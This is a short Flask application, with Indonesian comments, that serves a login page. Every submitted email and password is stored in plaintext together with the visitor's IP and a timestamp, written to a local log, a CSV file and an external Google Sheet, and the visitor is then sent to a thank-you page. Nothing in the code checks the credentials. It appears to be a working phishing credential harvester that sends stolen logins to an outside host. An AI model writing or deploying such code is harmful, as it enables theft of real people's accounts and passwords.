from flask import Flask, render_template, request, redirect
import csv
import datetime
import subprocess
import gspread 
from oauth2client.service_account import ServiceAccountCredentials

import json
import os

creds_dict = json.loads(os.environ["GOOGLE_CREDS_JSON"])
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['username']
    password = request.form['password']
    ip = request.remote_addr
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Simpan ke file log lokal
    with open("login.log", "a") as f:
        f.write(f"[{waktu}][{ip}] Email: {email} | Password: {password}\n")

    # Simpan ke CSV lokal
    with open("data_login.csv", "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([waktu, ip, email, password])

    # Simpan ke Google Sheets
    simpan_ke_google_sheets(waktu, ip, email, password)

    # (opsional) Konversi ke Excel jika kamu masih butuh
    subprocess.run(["python", "convert_to_excel.py"])

    return redirect("/terima_kasih")

@app.route('/terima_kasih')
def terima_kasih():
    return render_template('terima_kasih.html')

def simpan_ke_google_sheets(waktu, ip, email, password):
    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
    creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
    client = gspread.authorize(creds)

    sheet = client.open_by_key("1dHbrAVDtkRXZw607s02uZFujAqWRVlqyAoSal7RdmPI").sheet1
    sheet.append_row([waktu, ip, email, password])

if __name__ == '__main__':
    app.run(debug=True)
